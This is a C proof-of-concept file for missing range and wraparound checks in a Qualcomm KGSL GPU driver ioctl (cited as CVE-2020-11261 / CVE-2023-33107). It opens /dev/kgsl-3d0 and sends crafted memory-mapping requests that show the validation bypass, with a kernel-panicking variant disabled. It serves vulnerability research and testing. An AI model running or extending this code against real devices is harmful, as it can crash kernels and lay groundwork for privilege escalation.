/*
 * kgsl_bugA_poc.c - SAFE proof-of-concept for the missing SVM-range / wraparound
 * validation in kgsl_iommu_set_svm_region (CVE-2020-11261 / CVE-2023-33107).
 *
 * T1: in-SVM-range page            -> accepted (control)
 * T2: out-of-SVM-range page        -> accepted on vulnerable (patched: -ENOMEM)
 * T4: wraparound via HIGH address + SMALL size -> global check bypassed; fails
 *     gracefully in get_user_pages (-EFAULT), so no huge allocation / no panic.
 * (T3, huge-length wraparound, is DISABLED - it panics on this kernel.)
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_bugA_poc kgsl_bugA_poc.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_map_user_mem{int fd;u32 pad;u64 gpuaddr;u64 len;u64 offset;u64 hostptr;u32 memtype;u32 flags;};
#define IOCTL_MAP_USER_MEM IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x15,sizeof(struct kgsl_map_user_mem))
struct kgsl_sharedmem_free{unsigned long gpuaddr;};
#define IOCTL_SHAREDMEM_FREE IOC(_IOC_WRITE,KGSL_MAGIC,0x21,sizeof(struct kgsl_sharedmem_free))
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ull
#define KGSL_USER_MEM_TYPE_ADDR 2
static s64 anon_page(void){ return sys6(SYS_mmap, 0, 0x1000, 3, 0x22, -1, 0); }
static long map_usermem(long fd, u64 hostptr, u64 len){
    struct kgsl_map_user_mem m;
    for(u64 i=0;i<sizeof(m);i++)((u8*)&m)[i]=0;
    m.fd=-1; m.gpuaddr=0; m.len=len; m.offset=0; m.hostptr=hostptr;
    m.memtype=KGSL_USER_MEM_TYPE_ADDR; m.flags=(u32)KGSL_MEMFLAGS_USE_CPU_MAP;
    return sys3(SYS_ioctl, fd, IOCTL_MAP_USER_MEM, (s64)&m);
}
void _start(void){
    long fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    out("[*] open /dev/kgsl-3d0 = ");outdec(fd);out("\n");
    if(fd<0){out("[!] cannot open\n");sys3(SYS_exit,1,0,0);return;}

    s64 inrange = sys6(SYS_mmap, 0x700000000ull, 0x1000, 3, 0x32, -1, 0);
    if(inrange>0){
        long r = map_usermem(fd, (u64)inrange, 0x1000);
        out("[*] T1 in-SVM-range      hostptr=");outhex((u64)inrange);out(" len=0x1000 -> ");outdec(r);out("\n");
        if(r==0){ struct kgsl_sharedmem_free f; f.gpuaddr=(unsigned long)inrange; sys3(SYS_ioctl,fd,IOCTL_SHAREDMEM_FREE,(s64)&f); }
    }

    s64 p = anon_page();
    if(p>0){
        long r = map_usermem(fd, (u64)p, 0x1000);
        out("[*] T2 out-of-SVM-range  hostptr=");outhex((u64)p);out(" len=0x1000 -> ");outdec(r);
        if(r==0){ out("  <== MISSING SVM RANGE CHECK\n");
            struct kgsl_sharedmem_free f; f.gpuaddr=(unsigned long)p; sys3(SYS_ioctl,fd,IOCTL_SHAREDMEM_FREE,(s64)&f); }
        else out("\n");
    }

    {
        u64 hp = 0xfffffffffffff000ull; u64 ln = 0x2000ull;
        long r = map_usermem(fd, hp, ln);
        out("[*] T4 wrap high+small   hostptr=");outhex(hp);out(" len=0x2000 -> ");outdec(r);
        if(r==-14) out("  (-EFAULT from get_user_pages => global-check bypass reached, graceful)\n");
        else out("\n");
    }

    out("[*] done (no huge alloc; safe)\n");
    sys3(SYS_close,fd,0,0);
    sys3(SYS_exit,0,0,0);
}
